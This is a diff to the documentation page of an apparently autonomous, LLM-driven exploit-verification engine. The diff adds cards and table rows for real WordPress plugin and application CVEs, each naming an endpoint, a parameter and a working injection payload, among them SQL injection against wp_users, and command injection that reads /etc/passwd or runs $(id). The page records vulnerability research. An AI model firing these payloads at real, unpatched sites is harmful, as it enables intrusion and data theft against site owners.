@@ -164,9 +164,10 @@ footer a { color: var(--acc); text-decoration: none; }
     <p class="page-lead">Real vulnerabilities confirmed end-to-end by the binoracle autonomous engine: ephemeral Docker lab, Qwen-local LLM, zero human intervention after the initial command.</p>
 
     <div class="doc-metrics">
+      <div class="doc-metric"><div class="metric-value">19</div><div class="metric-label">Total CVEs verified</div></div>
       <div class="doc-metric"><div class="metric-value">9</div><div class="metric-label">WP CVEs verified</div></div>
-      <div class="doc-metric"><div class="metric-value">5</div><div class="metric-label">Generic CVEs verified</div></div>
-      <div class="doc-metric"><div class="metric-value">~100s</div><div class="metric-label">Avg time per CVE</div></div>
+      <div class="doc-metric"><div class="metric-value">10</div><div class="metric-label">Generic CVEs verified</div></div>
+      <div class="doc-metric"><div class="metric-value">~95s</div><div class="metric-label">Avg time per CVE</div></div>
       <div class="doc-metric"><div class="metric-value">0</div><div class="metric-label">Manual steps</div></div>
     </div>
 
@@ -287,6 +288,74 @@ footer a { color: var(--acc); text-decoration: none; }
       <div class="cve-payload">orderby=1' UNION SELECT NULL,version(),NULL,NULL,NULL,NULL-- -  → 6.7.0</div>
     </div>
 
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2024-27956</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-critical">CVSS 9.8</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>WP Automatic</strong> (ValvePress) — SQL injection via the <code>csv</code> AJAX action. Massively exploited in the wild in 2024; engine confirmed boolean in-band extraction with <code>diff=18</code> timing signature.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> boolean in-band</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
+        <span><strong>Param:</strong> <code>csv</code></span>
+      </div>
+      <div class="cve-payload">action=csv&csv=1' AND (SELECT 1 FROM wp_users LIMIT 1)-- -  → diff=18</div>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2023-23488</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-critical">CVSS 9.8</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>Paid Memberships Pro</strong> (≤ 2.9.8) — error-based SQL injection via the <code>code</code> parameter in the REST order endpoint. No authentication required. Raw value passed directly to <code>WHERE code = '$code'</code> without escaping; <code>extractvalue()</code> forces the MySQL version into the error message.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> error-based (extractvalue)</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>GET /wp-json/pmpro/v1/order?code=…</code></span>
+        <span><strong>Payload:</strong> <code>1' AND extractvalue(1,concat(0x7e,version()))#</code></span>
+      </div>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2025-39471</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-critical">CVSS 9.3</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>Modal Survey</strong> — SQL injection in the survey results endpoint. Boolean in-band extraction confirmed by the engine via response-length differential.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> boolean in-band</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
+      </div>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2026-2991</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-high">CVSS 8.5</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>KiviCare</strong> — authentication bypass via the <code>patientSocialLogin</code> AJAX action. Engine confirmed privilege escalation to patient account without credentials.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> auth bypass (missing capability check)</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
+        <span><strong>Action:</strong> <code>patientSocialLogin</code></span>
+      </div>
+    </div>
+
     <h2 id="generic-verified">Generic CVEs — Verified</h2>
 
     <p>These CVEs were verified against containerised vulnerable applications (not WordPress). The engine provisions the target service, crafts an exploit, and confirms the vulnerability condition without WordPress-specific scaffolding.</p>
@@ -342,6 +411,46 @@ footer a { color: var(--acc); text-decoration: none; }
           <td>9.1</td>
           <td><code>x-middleware-subrequest: middleware</code></td>
           <td>91.3 s</td>
+        </tr>
+        <tr>
+          <td>CVE-2025-57633</td>
+          <td>ftp-flask-python</td>
+          <td>Command Injection</td>
+          <td>9.8</td>
+          <td><code>filename=; id #</code></td>
+          <td>—</td>
+        </tr>
+        <tr>
+          <td>CVE-2025-59681</td>
+          <td>Django app</td>
+          <td>SQLi (boolean)</td>
+          <td>7.1</td>
+          <td><code>q=x' AND 1=1-- -</code> vs <code>AND 1=2</code></td>
+          <td>—</td>
+        </tr>
+        <tr>
+          <td>CVE-2025-64756</td>
+          <td>glob (Node.js)</td>
+          <td>Command Injection</td>
+          <td>7.5</td>
+          <td><code>pattern=; cat /etc/passwd</code></td>
+          <td>—</td>
+        </tr>
+        <tr>
+          <td>CVE-2026-27641</td>
+          <td>Flask-Reuploaded</td>
+          <td>SSTI</td>
+          <td>9.8</td>
+          <td><code>{{7*7}}</code> → <code>49</code> via <code>render_template_string</code></td>
+          <td>—</td>
+        </tr>
+        <tr>
+          <td>CVE-2026-55849</td>
+          <td>@cyclonedx/cyclonedx-npm</td>
+          <td>Command Injection</td>
+          <td>7.2</td>
+          <td><code>package-name=$(id)</code></td>
+          <td>—</td>
         </tr>
       </tbody>
     </table>
